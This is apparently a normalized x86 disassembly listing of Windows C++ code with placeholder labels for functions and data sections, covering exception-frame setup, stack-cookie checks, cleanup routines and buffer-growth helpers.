lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_416fb2
push 0x0
mov eax sub_44bdc3
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ edi + 0x8 ]
mov [ edi ] r--data
call sub_40487c
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_416ff5
push 0x0
mov eax sub_44a504
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_417025
push 0x0
mov eax sub_44a4e1
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_417055
push 0x0
mov eax sub_44a4be
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_417085
push 0x0
mov eax sub_44a49b
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4170b5
push 0x0
mov eax sub_44a478
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4170e5
push 0x0
mov eax sub_44a455
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_417115
push 0x0
mov eax sub_44a432
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_417145
push 0x0
mov eax sub_44a40f
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_417175
push 0x0
mov eax sub_44a3ec
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4171a5
push 0x0
mov eax sub_44a3c9
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4171d5
push 0x0
mov eax sub_44a3a6
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_417205
push 0x0
mov eax sub_44a383
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_417235
push 0x0
mov eax sub_44a360
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_417265
push 0x0
mov eax sub_44a33d
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_417295
push 0x0
mov eax sub_44bd95
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ edi + 0xc ]
mov [ edi ] r--data
call sub_403855
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4172d4
push 0x0
mov eax sub_44b084
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov edi [ edi + 0x8 ]
test edi edi
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c2c3
call sub_44866d
retn 0x4
lea esi [ edi + 0x4 ]
call sub_40c2c3
sub_41731a
push 0x0
mov eax sub_44b056
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov edi [ edi + 0x8 ]
test edi edi
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c2c3
call sub_44866d
retn 0x4
lea esi [ edi + 0x4 ]
call sub_40c2c3
sub_417360
push 0x0
mov eax sub_44b028
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov edi [ edi + 0x8 ]
test edi edi
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c2c3
call sub_44866d
retn 0x4
lea esi [ edi + 0x4 ]
call sub_40c2c3
sub_4173a6
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi eax
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4173c5
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi eax
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4173e4
push 0x4
mov eax sub_44a31a
call sub_4485c8
mov ebx ecx
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov edi [ ebx + 0x4 ]
sub edi [ ebx ]
sar edi 0x1
call sub_417bd2
test al al
je r-xdata
mov eax esi
call sub_44866d
retn 0x4
and [ ebp - 0x4 ] 0x0
mov ecx [ ebx + 0x4 ]
push [ ebp + 0x8 ]
mov ebx [ ebx ]
mov eax [ esi ]
push ecx
push ebx
call sub_41fced
add esp 0xc
mov [ esi + 0x4 ] eax
sub_417446
push esi
push edi
mov edi eax
mov esi ecx
mov eax [ esi + 0x4 ]
cmp edi eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
cmp ecx edi
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
call sub_417c1e
sub edi ecx
sar edi 0x1
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x2
pop edi
pop esi
retn
mov cx [ edi ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
call sub_417c1e
mov ecx [ esi ]
mov cx [ ecx + edi * 2 ]
jmp r-xdata
mov [ eax ] cx
sub_417497
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44ddcc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov edi edx
mov esi ecx
mov [ esp + 0x10 ] edi
call sub_40dcdf
mov ecx [ esi + 0x28 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ esp + 0x10 ]
xor eax eax
lea edi [ esp + 0x14 ]
stosb [ edi ]
push [ esp + 0x14 ]
lea edi [ esp + 0x10 ]
stosb [ edi ]
push [ esp + 0x10 ]
push ebx
call sub_417c56
lea eax [ esi + 0x8 ]
push eax
lea esi [ esp + 0x1c ]
call sub_404720
mov eax esi
call sub_415b35
mov [ esp + 0x34 ] eax
and [ esp + 0x48 ] 0x0
push ebx
mov ecx esi
mov edx edi
call sub_4198f8
or [ esp + 0x4c ] 0xffffffff
pop ecx
push 0x0
push 0x1
mov ecx esi
call sub_40487c
jmp r-xdata
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_4247dc
mov esp ebp
pop ebp
retn 0x8
sub_41755b
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44dd9c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov edi edx
mov esi ecx
mov [ esp + 0x10 ] edi
call sub_40dcdf
mov ecx [ esi + 0x28 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ esp + 0x10 ]
xor eax eax
lea edi [ esp + 0x14 ]
stosb [ edi ]
push [ esp + 0x14 ]
lea edi [ esp + 0x10 ]
stosb [ edi ]
push [ esp + 0x10 ]
push ebx
call sub_417c82
lea eax [ esi + 0x8 ]
push eax
lea esi [ esp + 0x1c ]
call sub_404720
mov eax esi
call sub_415b35
mov [ esp + 0x34 ] eax
and [ esp + 0x48 ] 0x0
push ebx
mov ecx esi
mov edx edi
call sub_4199a5
or [ esp + 0x4c ] 0xffffffff
pop ecx
push 0x0
push 0x1
mov ecx esi
call sub_40487c
jmp r-xdata
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_4247dc
mov esp ebp
pop ebp
retn 0x8
sub_41761f
push ebp
mov ebp esp
sub esp 0xc
push edi
call sub_40dcdf
mov ecx [ esi + 0xc ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
lea edi [ ebp - 0x5 ]
stosb [ edi ]
push [ ebp - 0x5 ]
lea edi [ ebp - 0x9 ]
stosb [ edi ]
push [ ebp - 0x9 ]
push [ ebp + 0x8 ]
call sub_417cae
mov al [ esi + 0x8 ]
push [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x1 ] al
call sub_419a52
pop ecx
jmp r-xdata
pop edi
leave
retn 0x10
sub_41766c
push ebp
mov ebp esp
push ecx
push ecx
push edi
call sub_40dcdf
mov ecx [ esi + 0xc ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
lea edi [ ebp - 0x8 ]
stosb [ edi ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_417cdb
mov eax [ esi + 0x8 ]
push [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
call sub_419ace
pop ecx
jmp r-xdata
pop edi
leave
retn 0x10
sub_4176b8
push ebp
mov ebp esp
push ecx
push edi
call sub_40dcdf
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebp + 0x10 ]
xor eax eax
lea edi [ ebp + 0x8 ]
stosb [ edi ]
push [ ebp + 0x8 ]
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
call sub_417d08
push [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
call sub_419b4a
pop ecx
jmp r-xdata
pop edi
leave
retn 0x14
sub_417715
push 0x2c
mov eax sub_44d171
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_417d35
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_417770
push 0x2c
mov eax sub_44d14e
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_417d62
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_4177cb
push 0x2c
mov eax sub_44d12b
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_417d8f
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_417826
push 0x2c
mov eax sub_44d108
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_417dbc
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_417881
push 0x2c
mov eax sub_44d0e5
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_417de9
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_4178dc
push 0x2c
mov eax sub_44d0c2
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_417e16
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_417948
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417978
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_4179a8
push ebp
mov ebp esp
sub esp 0xc
push edi
call sub_40dcdf
mov ecx [ esi + 0xc ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
lea edi [ ebp - 0x5 ]
stosb [ edi ]
push [ ebp - 0x5 ]
lea edi [ ebp - 0x9 ]
stosb [ edi ]
push [ ebp - 0x9 ]
push [ ebp + 0x8 ]
call sub_417e63
mov al [ esi + 0x8 ]
push [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x1 ] al
call sub_419bc6
pop ecx
jmp r-xdata
pop edi
leave
retn 0x10
sub_4179f5
push ebp
mov ebp esp
sub esp 0xc
push edi
call sub_40dcdf
mov ecx [ esi + 0xc ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
lea edi [ ebp - 0x5 ]
stosb [ edi ]
push [ ebp - 0x5 ]
lea edi [ ebp - 0x9 ]
stosb [ edi ]
push [ ebp - 0x9 ]
push [ ebp + 0x8 ]
call sub_417e90
mov al [ esi + 0x8 ]
push [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x1 ] al
call sub_419c42
pop ecx
jmp r-xdata
pop edi
leave
retn 0x10
sub_417a42
push ebp
mov ebp esp
push ecx
push ecx
push edi
call sub_40dcdf
mov ecx [ esi + 0xc ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
lea edi [ ebp - 0x8 ]
stosb [ edi ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_417ebd
mov eax [ esi + 0x8 ]
push [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
call sub_419cbe
pop ecx
jmp r-xdata
pop edi
leave
retn 0x10
sub_417a8e
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417abe
push 0x2c
mov eax sub_44d09f
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_417eea
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_417b19
push 0x2c
mov eax sub_44d07c
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_417f17
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_417b74
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417bd2
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi eax
jne r-xdata
cmp edi 0x7fffffff
jbe r-xdata
xor al al
retn
cmp edi eax
jbe r-xdata
push r--data
call sub_446a95
mov [ esi ] eax
mov [ esi + 0x4 ] eax
lea eax [ eax + edi * 2 ]
mov [ esi + 0x8 ] eax
mov al 0x1
retn
mov eax edi
call sub_419d58
sub_417c1e
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
sub eax ecx
sar eax 0x1
cmp eax 0x7ffffffe
jbe r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
inc eax
sar edx 0x1
cmp eax edx
jbe r-xdata
push r--data
call sub_446a95
retn
push eax
mov ecx esi
call sub_418042
push eax
mov ecx esi
call sub_417f9c
sub_417c56
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
push esi
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
cmp [ ecx ] 0x0
je r-xdata
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
jmp r-xdata
pop ecx
pop esi
pop ebp
retn 0xc
sub_417c82
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
push esi
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
cmp [ ecx ] 0x0
je r-xdata
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
jmp r-xdata
pop ecx
pop esi
pop ebp
retn 0xc
sub_417cae
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417cdb
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417d08
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417d35
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417d62
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417d8f
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417dbc
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417de9
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417e16
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417e63
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417e90
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417ebd
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417eea
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417f17
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_417f44
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi eax
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
sub_417f63
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi eax
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
sub_417f9c
push 0x8
mov eax sub_449ee9
call sub_4485c8
mov esi ecx
mov eax [ ebp + 0x8 ]
cmp eax 0x7fffffff
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
sar ecx 0x1
cmp ecx eax
jae r-xdata
push r--data
call sub_446a95
call sub_44866d
retn 0x4
test eax eax
jne r-xdata
call sub_419d58
mov ebx eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea eax [ ebx + eax * 2 ]
mov [ esi + 0x8 ] eax
lea eax [ ebx + edi * 2 ]
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
push eax
call sub_424fc7
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
push ebx
push ecx
call sub_41c4e6
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
pop ecx
sar edi 0x1
pop ecx
test eax eax
je r-xdata
sub_418042
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
mov edx 0x7fffffff
sar eax 0x1
mov ecx eax
shr ecx 0x1
sub edx ecx
cmp edx eax
jae r-xdata
add eax ecx
xor eax eax
jmp r-xdata
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
sub_418094
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
setl al
test eax eax
jne r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0xff
jle r-xdata
xor eax eax
push 0x2
pop eax
pop ebp
retn
sub_4180da
push 0x0
mov eax sub_44affa
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
inc ebx
mov [ edi ] bl
call sub_419ef7
lea esi [ eax + 0x8 ]
call sub_420542
mov [ edi + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
mov edx ebx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
